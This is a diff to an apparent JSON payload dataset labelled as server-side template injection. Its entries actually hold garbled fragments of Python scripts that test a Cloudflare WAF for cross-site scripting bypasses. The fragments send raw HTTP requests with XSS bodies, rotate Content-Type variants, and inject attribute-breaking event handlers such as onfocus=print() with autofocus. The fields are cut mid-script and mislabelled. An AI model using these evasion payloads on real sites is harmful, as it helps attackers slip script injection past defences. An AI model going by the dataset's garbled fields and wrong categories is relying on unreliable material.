@@ -1,7 +1,7 @@
 {
   "category": "ssti",
   "subcategory": "general",
-  "count": 8,
+  "count": 7,
   "payloads": [
     {
       "id": "ssti-0001",
@@ -25,20 +25,6 @@
       "description": "globalHtml\": \"{xss}\"}}'.encode()\n    raw_req(\n        b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n        b\"Content-Type: application/json\\r\\n\"\n        b\"Content-Length: \" + str(len(body)).encode() + b\"\\r\\n\"\n        b\"Connection: close\\r\\n\\r\\n\" + body)\n\n# B8: JSON5 / relaxed JSON\nfor xss in [XSS_SHORT]:\n    bodies = [\n        f\"{{globalHtml: '{xss}'}}\",  # unquoted keys\n        f'{{\"globalHtml\": \\'{xss}\\'}}'.encode(),  # single quoted value\n    ]\n\n# B9: Content-Type parameter manipulation\nCT_VARIANTS = [\n    'application/json; charset=utf-8',\n    'application/json; charset=UTF-8',\n    'application/json; charset=utf-16',\n    'application/json; charset=utf-32',\n    'application/json; charset=iso-8859-1',\n    'application/json;charset=utf-8',\n    'APPLICATION/JSON',\n    'application/JSON',\n    'text/json',\n    'text/x-json',\n    'application/vnd.api+json',\n    'application/ld+json',\n    'application/hal+json',\n    'application/json-patch+json',\n    'application/merge-patch+json',\n]\n\nfor ct in CT_VARIANTS:\n    body = json.dumps({\"globalHtml\": XSS_SHORT}).encode()\n    raw_req(\n        b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n        b\"Content-Type: \" + ct.encode() + b\"\\r\\n\"\n        b\"Content-Length: \" + str(len(body)).encode() + b\"\\r\\n\"\n        b\"Connection: close\\r\\n\\r\\n\" + body)\n\nprint(f\"  JSON done: {total} total",
       "technique": "encoding",
       "source_file": "waf_round81_waffled.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "ssti-0003",
-      "category": "ssti",
-      "subcategory": "general",
-      "payload": "(')[0] in lower if '(' in func else func.lower() in lower\n            mark = \"\"\n            if has_event and has_func:\n                mark = \" *** REFLECTED ***\"\n                found.append(f\"on{{focus={func}\")\n            elif not blocked:\n                mark = \" pass (check reflection)\"\n            print(f\"  on{{focus={func:35s}  HTTP {r.status_code}{mark}\")\n        else:\n            pass  # Don't print blocks to save space\n    except:\n        pass\n    time.sleep(0.1)\n\n# ══════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 80)\nprint(\"45C: Test print() with REAL Event Handlers (No Gap)\")\nprint(\"=\" * 80)\n\n# Is it print() that's special, not the gap?\nreal_events_print = {\n    \"onfocus-print-POST\": '\" onfocus=print() autofocus x=\"",
-      "description": "onclick-print-POST\": '\" onclick=print() x=\"',\n    \"onload-print-POST\": '\" onload=print() x=\"',\n    \"onerror-print-POST\": '\" onerror=print() x=\"',\n    \"onmouseover-print-POST\": '\" onmouseover=print() x=\"',\n    \"ontoggle-print-POST\": '\" ontoggle=print() x=\"',\n    \n    # GET versions\n    \"onfocus-print-GET\": '\" onfocus=print() autofocus x=\"',\n    \"onclick-print-GET\": '\" onclick=print() x=\"',\n}\n\nfor name, payload in real_events_print.items():\n    method = \"POST\" if \"POST\" in name else \"GET\"\n    try:\n        if method == \"POST\":\n            r = requests.post(BASE, data={\"attributeHtml\": payload},\n                             verify=False, timeout=TIMEOUT)\n        else:\n            r = requests.get(BASE, params={\"attributeHtml\": payload},\n                            verify=False, timeout=TIMEOUT)\n        blocked = r.status_code in (403, 406, 503)\n        mark = \" PASS\" if not blocked else \" BLOCK\"\n        if not blocked and 'onfocus=' in r.text.lower():\n            mark = \" *** REAL EVENT + PRINT REFLECTED ***\"\n            found.append(name)\n        print(f\"  {name:40s} HTTP {r.status_code}{mark}",
-      "technique": "direct_injection",
-      "source_file": "waf_round45_print_verify.py",
       "tested_against": [
         "cloudflare_waf"
       ],
